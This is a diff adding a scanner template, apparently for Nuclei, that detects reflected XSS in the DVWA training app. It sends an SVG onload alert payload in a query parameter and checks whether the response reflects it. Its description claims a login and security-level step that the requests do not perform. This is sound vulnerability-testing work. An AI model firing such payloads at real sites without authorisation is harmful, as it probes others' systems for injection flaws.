@@ -1,0 +1,34 @@
+id: DVWA-XSS-REFLECTED-AUTH
+
+info:
+  name: DVWA - Reflected XSS (auth required) - Detection
+  author: ai_vuln_scanner
+  severity: medium
+  description: |
+    Logs into DVWA, sets security to low, then triggers a reflected XSS payload
+    on the XSS (Reflected) module (xss_r / xss_d). Detection only.
+  tags: dvwa,xss,reflected,detect
+
+variables:
+  dvwa_cookie: ""
+  payload: "<svg/onload=alert(document.domain)>"
+  payload_enc: "%3Csvg%2Fonload%3Dalert%28document.domain%29%3E"
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/vulnerabilities/xss_r/?name={{payload_enc}}"
+    headers:
+      Cookie: "{{dvwa_cookie}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{payload}}"
+      - type: word
+        part: body
+        words:
+          - "Vulnerability: Reflected XSS"
+          - "XSS (Reflected)"
+        condition: or
